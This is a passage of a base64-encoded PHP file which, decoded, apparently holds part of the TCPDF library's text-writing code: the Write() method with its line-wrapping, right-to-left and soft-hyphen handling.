Jldl9sYXN0aDsKCQlyZXR1cm4gJGhlaWdodDsKCX0KCgkvKioKCSAqIFRoaXMgbWV0aG9kIHByaW50cyB0ZXh0IGZyb20gdGhlIGN1cnJlbnQgcG9zaXRpb24uPGJyIC8+CgkgKiBAcGFyYW0gZmxvYXQgJGggTGluZSBoZWlnaHQKCSAqIEBwYXJhbSBzdHJpbmcgJHR4dCBTdHJpbmcgdG8gcHJpbnQKCSAqIEBwYXJhbSBtaXhlZCAkbGluayBVUkwgb3IgaWRlbnRpZmllciByZXR1cm5lZCBieSBBZGRMaW5rKCkKCSAqIEBwYXJhbSBib29sZWFuICRmaWxsIEluZGljYXRlcyBpZiB0aGUgY2VsbCBiYWNrZ3JvdW5kIG11c3QgYmUgcGFpbnRlZCAodHJ1ZSkgb3IgdHJhbnNwYXJlbnQgKGZhbHNlKS4KCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEFsbG93cyB0byBjZW50ZXIgb3IgYWxpZ24gdGhlIHRleHQuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5MIG9yIGVtcHR5IHN0cmluZzogbGVmdCBhbGlnbiAoZGVmYXVsdCB2YWx1ZSk8L2xpPjxsaT5DOiBjZW50ZXI8L2xpPjxsaT5SOiByaWdodCBhbGlnbjwvbGk+PGxpPko6IGp1c3RpZnk8L2xpPjwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbiAkbG4gaWYgdHJ1ZSBzZXQgY3Vyc29yIGF0IHRoZSBib3R0b20gb2YgdGhlIGxpbmUsIG90aGVyd2lzZSBzZXQgY3Vyc29yIGF0IHRoZSB0b3Agb2YgdGhlIGxpbmUuCgkgKiBAcGFyYW0gaW50ICRzdHJldGNoIGZvbnQgc3RyZXRjaCBtb2RlOiA8dWw+PGxpPjAgPSBkaXNhYmxlZDwvbGk+PGxpPjEgPSBob3Jpem9udGFsIHNjYWxpbmcgb25seSBpZiB0ZXh0IGlzIGxhcmdlciB0aGFuIGNlbGwgd2lkdGg8L2xpPjxsaT4yID0gZm9yY2VkIGhvcml6b250YWwgc2NhbGluZyB0byBmaXQgY2VsbCB3aWR0aDwvbGk+PGxpPjMgPSBjaGFyYWN0ZXIgc3BhY2luZyBvbmx5IGlmIHRleHQgaXMgbGFyZ2VyIHRoYW4gY2VsbCB3aWR0aDwvbGk+PGxpPjQgPSBmb3JjZWQgY2hhcmFjdGVyIHNwYWNpbmcgdG8gZml0IGNlbGwgd2lkdGg8L2xpPjwvdWw+IEdlbmVyYWwgZm9udCBzdHJldGNoaW5nIGFuZCBzY2FsaW5nIHZhbHVlcyB3aWxsIGJlIHByZXNlcnZlZCB3aGVuIHBvc3NpYmxlLgoJICogQHBhcmFtIGJvb2xlYW4gJGZpcnN0bGluZSBpZiB0cnVlIHByaW50cyBvbmx5IHRoZSBmaXJzdCBsaW5lIGFuZCByZXR1cm4gdGhlIHJlbWFpbmluZyBzdHJpbmcuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZmlyc3RibG9jayBpZiB0cnVlIHRoZSBzdHJpbmcgaXMgdGhlIHN0YXJ0aW5nIG9mIGEgbGluZS4KCSAqIEBwYXJhbSBmbG9hdCAkbWF4aCBtYXhpbXVtIGhlaWdodC4gSXQgc2hvdWxkIGJlID49ICRoIGFuZCBsZXNzIHRoZW4gcmVtYWluaW5nIHNwYWNlIHRvIHRoZSBib3R0b20gb2YgdGhlIHBhZ2UsIG9yIDAgZm9yIGRpc2FibGUgdGhpcyBmZWF0dXJlLgoJICogQHBhcmFtIGZsb2F0ICR3YWRqIGZpcnN0IGxpbmUgd2lkdGggd2lsbCBiZSByZWR1Y2VkIGJ5IHRoaXMgYW1vdW50ICh1c2VkIGluIEhUTUwgbW9kZSkuCgkgKiBAcGFyYW0gYXJyYXl8bnVsbCAkbWFyZ2luIG1hcmdpbiBhcnJheSBvZiB0aGUgcGFyZW50IGNvbnRhaW5lcgoJICogQHJldHVybiBtaXhlZCBSZXR1cm4gdGhlIG51bWJlciBvZiBjZWxscyBvciB0aGUgcmVtYWluaW5nIHN0cmluZyBpZiAkZmlyc3RsaW5lID0gdHJ1ZS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFdyaXRlKCRoLCAkdHh0LCAkbGluaz0nJywgJGZpbGw9ZmFsc2UsICRhbGlnbj0nJywgJGxuPWZhbHNlLCAkc3RyZXRjaD0wLCAkZmlyc3RsaW5lPWZhbHNlLCAkZmlyc3RibG9jaz1mYWxzZSwgJG1heGg9MCwgJHdhZGo9MCwgJG1hcmdpbj1udWxsKSB7CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHRoaXMtPngsICR0aGlzLT55KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkdGhpcy0+eCwgJHRoaXMtPnkpOwoJCWlmIChzdHJsZW4oJHR4dCkgPT0gMCkgewoJCQkvLyBmaXggZW1wdHkgdGV4dAoJCQkkdHh0ID0gJyAnOwoJCX0KCQlpZiAoIWlzX2FycmF5KCRtYXJnaW4pKSB7CgkJCS8vIHNldCBkZWZhdWx0IG1hcmdpbnMKCQkJJG1hcmdpbiA9ICR0aGlzLT5jZWxsX21hcmdpbjsKCQl9CgkJLy8gcmVtb3ZlIGNhcnJpYWdlIHJldHVybnMKCQkkcyA9IHN0cl9yZXBsYWNlKCJcciIsICcnLCAkdHh0KTsKCQkvLyBjaGVjayBpZiBzdHJpbmcgY29udGFpbnMgYXJhYmljIHRleHQKCQlpZiAocHJlZ19tYXRjaChUQ1BERl9GT05UX0RBVEE6OiR1bmlfUkVfUEFUVEVSTl9BUkFCSUMsICRzKSkgewoJCQkkYXJhYmljID0gdHJ1ZTsKCQl9IGVsc2UgewoJCQkkYXJhYmljID0gZmFsc2U7CgkJfQoJCS8vIGNoZWNrIGlmIHN0cmluZyBjb250YWlucyBSVEwgdGV4dAoJCWlmICgkYXJhYmljIE9SICgkdGhpcy0+dG1wcnRsID09ICdSJykgT1IgcHJlZ19tYXRjaChUQ1BERl9GT05UX0RBVEE6OiR1bmlfUkVfUEFUVEVSTl9SVEwsICRzKSkgewoJCQkkcnRsbW9kZSA9IHRydWU7CgkJfSBlbHNlIHsKCQkJJHJ0bG1vZGUgPSBmYWxzZTsKCQl9CgkJLy8gZ2V0IGEgY2hhciB3aWR0aAoJCSRjaHJ3aWR0aCA9ICR0aGlzLT5HZXRDaGFyV2lkdGgoNDYpOyAvLyBkb3QgY2hhcmFjdGVyCgkJLy8gZ2V0IGFycmF5IG9mIHVuaWNvZGUgdmFsdWVzCgkJJGNoYXJzID0gVENQREZfRk9OVFM6OlVURjhTdHJpbmdUb0FycmF5KCRzLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCS8vIGNhbGN1bGF0ZSBtYXhpbXVtIHdpZHRoIGZvciBhIHNpbmdsZSBjaGFyYWN0ZXIgb24gc3RyaW5nCgkJJGNocncgPSAkdGhpcy0+R2V0QXJyU3RyaW5nV2lkdGgoJGNoYXJzLCAnJywgJycsIDAsIHRydWUpOwoJCWFycmF5X3dhbGsoJGNocncsIGFycmF5KCR0aGlzLCAnZ2V0UmF3Q2hhcldpZHRoJykpOwoJCSRtYXhjaHdpZHRoID0gKChpc19hcnJheSgkY2hydykgfHwgJGNocncgaW5zdGFuY2VvZiBDb3VudGFibGUpICYmIGNvdW50KCRjaHJ3KSA+IDApID8gbWF4KCRjaHJ3KSA6IDA7CgkJLy8gZ2V0IGFycmF5IG9mIGNoYXJzCgkJJHVjaGFycyA9IFRDUERGX0ZPTlRTOjpVVEY4QXJyYXlUb1VuaUFycmF5KCRjaGFycywgJHRoaXMtPmlzdW5pY29kZSk7CgkJLy8gZ2V0IHRoZSBudW1iZXIgb2YgY2hhcmFjdGVycwoJCSRuYiA9IGNvdW50KCRjaGFycyk7CgkJLy8gcmVwbGFjZW1lbnQgZm9yIFNIWSBjaGFyYWN0ZXIgKG1pbnVzIHN5bWJvbCkKCQkkc2h5X3JlcGxhY2VtZW50ID0gNDU7CgkJJHNoeV9yZXBsYWNlbWVudF9jaGFyID0gVENQREZfRk9OVFM6OnVuaWNocigkc2h5X3JlcGxhY2VtZW50LCAkdGhpcy0+aXN1bmljb2RlKTsKCQkvLyB3aWRodCBmb3IgU0hZIHJlcGxhY2VtZW50CgkJJHNoeV9yZXBsYWNlbWVudF93aWR0aCA9ICR0aGlzLT5HZXRDaGFyV2lkdGgoJHNoeV9yZXBsYWNlbWVudCk7CgkJLy8gcGFnZSB3aWR0aAoJCSRwdyA9ICR3ID0gJHRoaXMtPncgLSAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luOwoJCS8vIGNhbGN1bGF0ZSByZW1haW5pbmcgbGluZSB3aWR0aCAoJHcpCgkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJJHcgPSAkdGhpcy0+eCAtICR0aGlzLT5sTWFyZ2luOwoJCX0gZWxzZSB7CgkJCSR3ID0gJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbiAtICR0aGlzLT54OwoJCX0KCQkvLyBtYXggY29sdW1uIHdpZHRoCgkJJHdtYXggPSAoJHcgLSAkd2Fkaik7CgkJaWYgKCEkZmlyc3RsaW5lKSB7CgkJCSR3bWF4IC09ICgkdGhpcy0+Y2VsbF9wYWRkaW5nWydMJ10gKyAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10pOwoJCX0KCQlpZiAoKCEkZmlyc3RsaW5lKSBBTkQgKCgkY2hyd2lkdGggPiAkd21heCkgT1IgKCRtYXhjaHdpZHRoID4gJHdtYXgpKSkgewoJCQkvLyB0aGUgbWF4aW11bSB3aWR0aCBjaGFyYWN0ZXIgZG8gbm90IGZpdCBvbiBjb2x1bW4KCQkJcmV0dXJuICcnOwoJCX0KCQkvLyBtaW5pbXVtIHJvdyBoZWlnaHQKCQkkcm93X2hlaWdodCA9IG1heCgkaCwgJHRoaXMtPmdldENlbGxIZWlnaHQoJHRoaXMtPkZvbnRTaXplKSk7CgkJLy8gbWF4IFkKCQkkbWF4eSA9ICR0aGlzLT55ICsgJG1heGggLSBtYXgoJHJvd19oZWlnaHQsICRoKTsKCQkkc3RhcnRfcGFnZSA9ICR0aGlzLT5wYWdlOwoJCSRpID0gMDsgLy8gY2hhcmFjdGVyIHBvc2l0aW9uCgkJJGogPSAwOyAvLyBjdXJyZW50IHN0YXJ0aW5nIHBvc2l0aW9uCgkJJHNlcCA9IC0xOyAvLyBwb3NpdGlvbiBvZiB0aGUgbGFzdCBibGFuayBzcGFjZQoJCSRwcmV2c2VwID0gJHNlcDsgLy8gcHJldmlvdXMgc2VwYXJhdG9yCgkJJHNoeSA9IGZhbHNlOyAvLyB0cnVlIGlmIHRoZSBsYXN0IGJsYW5rIGlzIGEgc29mdCBoeXBlbiAoU0hZKQoJCSRwcmV2c2h5ID0gJHNoeTsgLy8gcHJldmlvdXMgc2h5IG1vZGUKCQkkbCA9IDA7IC8vIGN1cnJlbnQgc3RyaW5nIGxlbmd0aAoJCSRubCA9IDA7IC8vbnVtYmVyIG9mIGxpbmVzCgkJJGxpbmVicmVhayA9IGZhbHNlOwoJCSRwYyA9IDA7IC8vIHByZXZpb3VzIGNoYXJhY3RlcgoJCS8vIGZvciBlYWNoIGNoYXJhY3RlcgoJCXdoaWxlICgkaSA8ICRuYikgewoJCQlpZiAoKCRtYXhoID4gMCkgQU5EICgkdGhpcy0+eSA+ICRtYXh5KSApIHsKCQkJCWJyZWFrOwoJCQl9CgkJCS8vR2V0IHRoZSBjdXJyZW50IGNoYXJhY3RlcgoJCQkkYyA9ICRjaGFyc1skaV07CgkJCWlmICgkYyA9PSAxMCkgeyAvLyAxMCA9ICJcbiIgPSBuZXcgbGluZQoJCQkJLy9FeHBsaWNpdCBsaW5lIGJyZWFrCgkJCQlpZiAoJGFsaWduID09ICdKJykgewoJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCSR0YWxpZ24gPSAnUic7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRhbGlnbiA9ICdMJzsKCQkJCQl9CgkJCQl9IGVsc2UgewoJCQkJCSR0YWxpZ24gPSAkYWxpZ247CgkJCQl9CgkJCQkkdG1wc3RyID0gVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAkaiwgJGkpOwoJCQkJaWYgKCRmaXJzdGxpbmUpIHsKCQkJCQkkc3RhcnR4ID0gJHRoaXMtPng7CgkJCQkJJHRtcGFyciA9IGFycmF5X3NsaWNlKCRjaGFycywgJGosICgkaSAtICRqKSk7CgkJCQkJaWYgKCRydGxtb2RlKSB7CgkJCQkJCSR0bXBhcnIgPSBUQ1BERl9GT05UUzo6dXRmOEJpZGkoJHRtcGFyciwgJHRtcHN0ciwgJHRoaXMtPnRtcHJ0bCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCQl9CgkJCQkJJGxpbmV3ID0gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKCR0bXBhcnIpOwoJCQkJCXVuc2V0KCR0bXBhcnIpOwoJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCSR0aGlzLT5lbmRsaW5leCA9ICRzdGFydHggLSAkbGluZXc7CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHRoaXMtPmVuZGxpbmV4ID0gJHN0YXJ0eCArICRsaW5ldzsKCQkJCQl9CgkJCQkJJHcgPSAkbGluZXc7CgkJCQkJJHRtcGNlbGxwYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkJCQlpZiAoJG1heGggPT0gMCkgewoJCQkJCQkkdGhpcy0+c2V0Q2VsbFBhZGRpbmcoMCk7CgkJCQkJfQoJCQkJfQoJCQkJaWYgKCRmaXJzdGJsb2NrIEFORCAkdGhpcy0+aXNSVExUZXh0RGlyKCkpIHsKCQkJCQkkdG1wc3RyID0gJHRoaXMtPnN0cmluZ1JpZ2h0VHJpbSgkdG1wc3RyKTsKCQkJCX0KCQkJCS8vIFNraXAgbmV3bGluZXMgYXQgdGhlIGJlZ2lubmluZyBvZiBhIHBhZ2Ugb3IgY29sdW1uCgkJCQlpZiAoIWVtcHR5KCR0bXBzdHIpIE9SICgkdGhpcy0+eSA8ICgkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciAtICRyb3dfaGVpZ2h0KSkpIHsKCQkJCQkkdGhpcy0+Q2VsbCgkdywgJGgsICR0bXBzdHIsIDAsIDEsICR0YWxpZ24sICRmaWxsLCAkbGluaywgJHN0cmV0Y2gpOwoJCQkJfQoJCQkJdW5zZXQoJHRtcHN0cik7CgkJCQlpZiAoJGZpcnN0bGluZSkgewoJCQkJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSAkdG1wY2VsbHBhZGRpbmc7CgkJCQkJcmV0dXJuIChUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKCR1Y2hhcnMsICRpKSk7CgkJCQl9CgkJCQkrKyRubDsKCQkJCSRqID0gJGkgKyAxOwoJCQkJJGwgPSAwOwoJCQkJJHNlcCA9IC0xOwoJCQkJJHByZXZzZXAgPSAkc2VwOwoJCQkJJHNoeSA9IGZhbHNlOwoJCQkJLy8gYWNjb3VudCBmb3IgbWFyZ2luIGNoYW5nZXMKCQkJCWlmICgoKCR0aGlzLT55ICsgJHRoaXMtPmxhc3RoKSA+ICR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyKSBBTkQgKCR0aGlzLT5pblBhZ2VCb2R5KCkpKSB7CgkJCQkJaWYgKCR0aGlzLT5BY2NlcHRQYWdlQnJlYWsoKSkKCQkJCQl7CgkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkkdGhpcy0+eCAtPSAkbWFyZ2luWydSJ107CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdGhpcy0+eCArPSAkbWFyZ2luWydMJ107CgkJCQkJCX0KCQkJCQkJJHRoaXMtPmxNYXJnaW4gKz0gJG1hcmdpblsnTCddOwoJCQkJCQkkdGhpcy0+ck1hcmdpbiArPSAkbWFyZ2luWydSJ107CgkJCQkJfQoJCQkJfQoJCQkJJHcgPSAkdGhpcy0+Z2V0UmVtYWluaW5nV2lkdGgoKTsKCQkJCSR3bWF4ID0gKCR3IC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddKTsKCQkJfSBlbHNlIHsKCQkJCS8vIDE2MCBpcyB0aGUgbm9uLWJyZWFraW5nIHNwYWNlLgoJCQkJLy8gMTczIGlzIFNIWSAoU29mdCBIeXBlbikuCgkJCQkvLyBccHtafSBvciBccHtTZXBhcmF0b3J9OiBhbnkga2luZCBvZiBVbmljb2RlIHdoaXRlc3BhY2Ugb3IgaW52aXNpYmxlIHNlcGFyYXRvci4KCQkJCS8vIFxwe0xvfSBvciBccHtPdGhlcl9MZXR0ZXJ9OiBhIFVuaWNvZGUgbGV0dGVyIG9yIGlkZW9ncmFwaCB0aGF0IGRvZXMgbm90IGhhdmUgbG93ZXJjYXNlIGFuZCB1cHBlcmNhc2UgdmFyaWFudHMuCgkJCQkvLyBccHtMb30gaXMgbmVlZGVkIGJlY2F1c2UgQ2hpbmVzZSBjaGFyYWN0ZXJzIGFyZSBwYWNrZWQgbmV4dCB0byBlYWNoIG90aGVyIHdpdGhvdXQgc3BhY2VzIGluIGJldHdlZW4uCgkJCQlpZiAoKCRjICE9IDE2MCkKCQkJCQlBTkQgKCgkYyA9PSAxNzMpCgkJCQkJCU9SIHByZWdfbWF0Y2goJHRoaXMtPnJlX3NwYWNlcywgVENQREZfRk9OVFM6OnVuaWNocigkYywgJHRoaXMtPmlzdW5pY29kZSkpCgkJCQkJCU9SICgoJGMgPT0gNDUpCgkJCQkJCQlBTkQgKCRpIDwgKCRuYiAtIDEpKQoJCQkJCQkJQU5EIEBwcmVnX21hdGNoKCcvW1xwe0x9XS8nLiR0aGlzLT5yZV9zcGFjZVsnbSddLCBUQ1BERl9GT05UUzo6dW5pY2hyKCRwYywgJHRoaXMtPmlzdW5pY29kZSkpCgkJCQkJCQlBTkQgQHByZWdfbWF0Y2goJy9bXHB7TH1dLycuJHRoaXMtPnJlX3NwYWNlWydtJ10sIFRDUERGX0ZPTlRTOjp1bmljaHIoJGNoYXJzWygkaSArIDEpXSwgJHRoaXMtPmlzdW5pY29kZSkpCgkJCQkJCSkKCQkJCQkpCgkJCQkpIHsKCQkJCQkvLyB1cGRhdGUgbGFzdCBibGFuayBzcGFjZSBwb3NpdGlvbgoJCQkJCSRwcmV2c2VwID0gJHNlcDsKCQkJCQkkc2VwID0gJGk7CgkJCQkJLy8gY2hlY2sgaWYgaXMgYSBTSFkKCQkJCQlpZiAoKCRjID09IDE3MykgT1IgKCRjID09IDQ1KSkgewoJCQkJCQkkcHJldnNoeSA9ICRzaHk7CgkJCQkJCSRzaHkgPSB0cnVlOwoJCQkJCQlpZiAoJHBjID09IDQ1KSB7CgkJCQkJCQkkdG1wX3NoeV9yZXBsYWNlbWVudF93aWR0aCA9IDA7CgkJCQkJCQkkdG1wX3NoeV9yZXBsYWNlbWVudF9jaGFyID0gJyc7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkdG1wX3NoeV9yZXBsYWNlbWVudF93aWR0aCA9ICRzaHlfcmVwbGFjZW1lbnRfd2lkdGg7CgkJCQkJCQkkdG1wX3NoeV9yZXBsYWNlbWVudF9jaGFyID0gJHNoeV9yZXBsYWNlbWVudF9jaGFyOwoJCQkJCQl9CgkJCQkJfSBlbHNlIHsKCQkJCQkJJHNoeSA9IGZhbHNlOwoJCQkJCX0KCQkJCX0KCQkJCS8vIHVwZGF0ZSBzdHJpbmcgbGVuZ3RoCgkJCQlpZiAoJHRoaXMtPmlzVW5pY29kZUZvbnQoKSBBTkQgKCRhcmFiaWMpKSB7CgkJCQkJLy8gd2l0aCBiaWRpcmVjdGlvbmFsIGFsZ29yaXRobSBzb21lIGNoYXJzIG1heSBiZSBjaGFuZ2VkIGFmZmVjdGluZyB0aGUgbGluZSBsZW5ndGgKCQkJCQkvLyAqKiogdmVyeSBzbG93ICoqKgoJCQkJCSRsID0gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKFRDUERGX0ZPTlRTOjp1dGY4QmlkaShhcnJheV9zbGljZSgkY2hhcnMsICRqLCAoJGkgLSAkaikpLCAnJywgJHRoaXMtPnRtcHJ0bCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KSk7CgkJCQl9IGVsc2UgewoJCQkJCSRsICs9ICR0aGlzLT5HZXRDaGFyV2lkdGgoJGMsICgkaSsxIDwgJG5iKSk7CgkJCQl9CgkJCQlpZiAoKCRsID4gJHdtYXgpIE9SICgoJGMgPT0gMTczKSBBTkQgKCgkbCArICR0bXBfc2h5X3JlcGxhY2VtZW50X3dpZHRoKSA+PSAkd21heCkpKSB7CgkJCQkJaWYgKCgkYyA9PSAxNzMpIEFORCAoKCRsICsgJHRtcF9zaHlfcmVwbGFjZW1lbnRfd2lkdGgpID4gJHdtYXgpKSB7CgkJCQkJCSRzZXAgPSAkcHJldnNlcDsKCQkJCQkJJHNoeSA9ICRwcmV2c2h5OwoJCQkJCX0KCQkJCQkvLyB3ZSBoYXZlIHJlYWNoZWQgdGhlIGVuZCBvZiBjb2x1bW4KCQkJCQlpZiAoJHNlcCA9PSAtMSkgewoJCQkJCQkvLyBjaGVjayBpZiB0aGUgbGluZSB3YXMgYWxyZWFkeSBzdGFydGVkCgkJCQkJCWlmICgoJHRoaXMtPnJ0bCBBTkQgKCR0aGlzLT54IDw9ICgkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHRoaXMtPmNlbGxfcGFkZGluZ1snUiddIC0gJG1hcmdpblsnUiddIC0gJGNocndpZHRoKSkpCgkJCQkJCQlPUiAoKCEkdGhpcy0+cnRsKSBBTkQgKCR0aGlzLT54ID49ICgkdGhpcy0+bE1hcmdpbiArICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSArICRtYXJnaW5bJ0wnXSArICRjaHJ3aWR0aCkpKSkgewoJCQkJCQkJLy8gcHJpbnQgYSB2b2lkIGNlbGwgYW5kIGdvIHRvIG5leHQgbGluZQoJCQkJCQkJJHRoaXMtPkNlbGwoJHcsICRoLCAnJywgMCwgMSk7CgkJCQkJCQkkbGluZWJyZWFrID0gdHJ1ZTsKCQkJCQkJCWlmICgkZmlyc3RsaW5lKSB7CgkJCQkJCQkJcmV0dXJuIChUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKCR1Y2hhcnMsICRqKSk7CgkJCQkJCQl9CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkvLyB0cnVuY2F0ZSB0aGUgd29yZCBiZWNhdXNlIGRvIG5vdCBmaXQgb24gY29sdW1uCgkJCQkJCQkkdG1wc3RyID0gVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAkaiwgJGkpOwoJCQkJCQkJaWYgKCRmaXJzdGxpbmUpIHsKCQkJCQkJCQkkc3RhcnR4ID0gJHRoaXMtPng7CgkJCQkJCQkJJHRtcGFyciA9IGFycmF5X3NsaWNlKCRjaGFycywgJGosICgkaSAtICRqKSk7CgkJCQkJCQkJaWYgKCRydGxtb2RlKSB7CgkJCQkJCQkJCSR0bXBhcnIgPSBUQ1BERl9GT05UUzo6dXRmOEJpZGkoJHRtcGFyciwgJHRtcHN0ciwgJHRoaXMtPnRtcHJ0bCwgJHRoaXMtPmlzdW5pY29kZSwgJHRoaXMtPkN1cnJlbnRGb250KTsKCQkJCQkJCQl9CgkJCQkJCQkJJGxpbmV3ID0gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKCR0bXBhcnIpOwoJCQkJCQkJCXVuc2V0KCR0bXBhcnIpOwoJCQkJCQkJCWlmICgkdGhpcy0+cnRsKSB7CgkJCQkJCQkJCSR0aGlzLT5lbmRsaW5leCA9ICRzdGFydHggLSAkbGluZXc7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJHRoaXMtPmVuZGxpbmV4ID0gJHN0YXJ0eCArICRsaW5ldzsKCQkJCQkJCQl9CgkJCQkJCQkJJHcgPSAkbGluZXc7CgkJCQkJCQkJJHRtcGNlbGxwYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkJCQkJCQlpZiAoJG1heGggPT0gMCkgewoJCQkJCQkJCQkkdGhpcy0+c2V0Q2VsbFBhZGRpbmcoMCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJaWYgKCRmaXJzdGJsb2NrIEFORCAkdGhpcy0+aXNSVExUZXh0RGlyKCkpIHsKCQkJCQkJCQkkdG1wc3RyID0gJHRoaXMtPnN0cmluZ1JpZ2h0VHJpbSgkdG1wc3RyKTsKCQkJCQkJCX0KCQkJCQkJCSR0aGlzLT5DZWxsKCR3LCAkaCwgJHRtcHN0ciwgMCwgMSwgJGFsaWduLCAkZmlsbCwgJGxpbmssICRzdHJldGNoKTsKCQkJCQkJCXVuc2V0KCR0bXBzdHIpOwoJCQkJCQkJaWYgKCRmaXJzdGxpbmUpIHsKCQkJCQkJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJHRtcGNlbGxwYWRkaW5nOwoJCQkJCQkJCXJldHVybiAoVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAkaSkpOwoJCQkJCQkJfQoJCQkJCQkJJGogPSAkaTsKCQkJCQkJCS0tJGk7CgkJCQkJCX0KCQkJCQl9IGVsc2UgewoJCQkJCQkvLyB3b3JkIHdyYXBwaW5nCgkJCQkJCWlmICgkdGhpcy0+cnRsIEFORCAoISRmaXJzdGJsb2NrKSBBTkQgKCRzZXAgPCAkaSkpIHsKCQkJCQkJCSRlbmRzcGFjZSA9IDE7CgkJCQkJCX0gZWxzZSB7CgkJCQkJCQkkZW5kc3BhY2UgPSAwOwoJCQkJCQl9CgkJCQkJCS8vIGNoZWNrIHRoZSBsZW5ndGggb2YgdGhlIG5leHQgc3RyaW5nCgkJCQkJCSRzdHJyZXN0ID0gVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAoJHNlcCArICRlbmRzcGFjZSkpOwoJCQkJCQkkbmV4dHN0ciA9IFRDUERGX1NUQVRJQzo6cHJlZ1NwbGl0KCcvJy4kdGhpcy0+cmVfc3BhY2VbJ3AnXS4nLycsICR0aGlzLT5yZV9zcGFjZVsnbSddLCAkdGhpcy0+c3RyaW5nVHJpbSgkc3RycmVzdCkpOwoJCQkJCQlpZiAoaXNzZXQoJG5leHRzdHJbMF0pIEFORCAoJHRoaXMtPkdldFN0cmluZ1dpZHRoKCRuZXh0c3RyWzBdKSA+ICRwdykpIHsKCQkJCQkJCS8vIHRydW5jYXRlIHRoZSB3b3JkIGJlY2F1c2UgZG8gbm90IGZpdCBvbiBhIGZ1bGwgcGFnZSB3aWR0aAoJCQkJCQkJJHRtcHN0ciA9IFRDUERGX0ZPTlRTOjpVbmlBcnJTdWJTdHJpbmcoJHVjaGFycywgJGosICRpKTsKCQkJCQkJCWlmICgkZmlyc3RsaW5lKSB7CgkJCQkJCQkJJHN0YXJ0eCA9ICR0aGlzLT54OwoJCQkJCQkJCSR0bXBhcnIgPSBhcnJheV9zbGljZSgkY2hhcnMsICRqLCAoJGkgLSAkaikpOwoJCQkJCQkJCWlmICgkcnRsbW9kZSkgewoJCQkJCQkJCQkkdG1wYXJyID0gVENQREZfRk9OVFM6OnV0ZjhCaWRpKCR0bXBhcnIsICR0bXBzdHIsICR0aGlzLT50bXBydGwsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJCQkJfQoJCQkJCQkJCSRsaW5ldyA9ICR0aGlzLT5HZXRBcnJTdHJpbmdXaWR0aCgkdG1wYXJyKTsKCQkJCQkJCQl1bnNldCgkdG1wYXJyKTsKCQkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCQkkdGhpcy0+ZW5kbGluZXggPSAoJHN0YXJ0eCAtICRsaW5ldyk7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJHRoaXMtPmVuZGxpbmV4ID0gKCRzdGFydHggKyAkbGluZXcpOwoJCQkJCQkJCX0KCQkJCQkJCQkkdyA9ICRsaW5ldzsKCQkJCQkJCQkkdG1wY2VsbHBhZGRpbmcgPSAkdGhpcy0+Y2VsbF9wYWRkaW5nOwoJCQkJCQkJCWlmICgkbWF4aCA9PSAwKSB7CgkJCQkJCQkJCSR0aGlzLT5zZXRDZWxsUGFkZGluZygwKTsKCQkJCQkJCQl9CgkJCQkJCQl9CgkJCQkJCQlpZiAoJGZpcnN0YmxvY2sgQU5EICR0aGlzLT5pc1JUTFRleHREaXIoKSkgewoJCQkJCQkJCSR0bXBzdHIgPSAkdGhpcy0+c3RyaW5nUmlnaHRUcmltKCR0bXBzdHIpOwoJCQkJCQkJfQoJCQkJCQkJJHRoaXMtPkNlbGwoJHcsICRoLCAkdG1wc3RyLCAwLCAxLCAkYWxpZ24sICRmaWxsLCAkbGluaywgJHN0cmV0Y2gpOwoJCQkJCQkJdW5zZXQoJHRtcHN0cik7CgkJCQkJCQlpZiAoJG